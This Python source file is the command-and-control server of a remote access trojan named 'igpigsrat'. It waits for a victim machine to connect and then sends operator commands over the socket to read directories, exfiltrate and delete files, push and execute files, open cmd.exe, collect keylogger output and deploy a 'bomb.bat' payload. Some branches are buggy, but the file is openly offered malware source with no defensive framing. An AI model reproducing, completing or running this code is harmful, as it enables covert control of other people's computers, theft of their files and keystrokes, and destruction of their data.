import socket
import os
import pynput



s = socket.socket()
host=socket.gethostname()
port=8080
s.bind((host,port))
print("")
print("server is currently running @ ", host)
print("")
print("waiting fot sny incoming connections...")
s.listen(1)
conn, addr =s.accept()
print("")
print(addr,"Has connected to the server successfully")
RAT = open("igpigsrat.txt", "rt")
contents = RAT.read()
RAT.close()
print(contents)
print("")
print("")
print("")





while 1 :
  command = input(str("command >> "))
  if command == "view_cwd":
      conn.send(command.encode())
      print("")
      print("command sent waiting for execution ... ")
      print("")
      files = conn.recv(5000)
      files = files.decode()
      print("Command output : ", files)

  elif command == "custom_dir":
    conn.send(command.encode())
    print("")
    user_input = input(str("Custom dir : "))
    conn.send(user_input.encode())
    print("")
    print("Command has been sent ")
    files = conn.recv(5000)
    files = files.decode()
    print("custom dir Result : ", files)


  elif command == "download_file":
    conn.send(command.encode())
    filepath = input(str("pelase enter the file path including the file name : "))
    conn.send(filepath.encode())
    file = conn.recv(10000000)
    filename = input (str("please enter the filename for the incoming file including the extentsion : "))
    new_file = open(filename, "wb")
    new_file.write(file)
    new_file.close
    print("")
    print(filename, "has been downlaod and saved")
    print("")

  elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str("please eenter the filename and directroy : "))
        conn.send(fileanddir.encode())
        print("")
        print("file has been removed")

  

  elif command == "send_file":
    conn.send(command.encode())
    file = input(str("please enter the filename and directory : "))
    filename = input(str("please enter the filename and directory : "))
    data = open(file, "rb")
    file_data = data.read(7000)
    
    print(file, "has been sent successfully ")
    conn.send(file_data)    
  


  elif command == "client_info": 
     conn.send(command.encode())
     h_name = conn.recv(1024)
     clientname = h_name.decode()
     clientinfo = addr, clientname
     print(clientinfo)
     print("")
     print("command as been executed successfully")
  
  
  elif command == "exe_file":
      conn.send(command.encode())
      exe_path = input(str("Enter the file name and directory : "))
      conn.send(exe_path.encode())
      print("")
      print("command as been executed successfully")
  
  
  
  elif command == "cmd":
      conn.send(command.encode())
      cmdpath = (str("C:\windows\system32\cmd.exe"))
      conn.send(cmdpath.encode())
      print("")
      print("command as been executed successfully")
  
  
  
  elif command == "key_logger":
      conn.send(command.encode())
      alphpressedkeys = s.recv(5000)
      speskeys = s.recv(5000)
      print(alphpressedkeys)
      print(speskeys)

      
  
  elif command == "bomb":
    conn.send(command.encode())
    bomb = (str("bomb.bat"))
    conn.send(bomb.encode())
      
      
      
      
      
      
  else:
      print("")
      print("command not recognised")
    
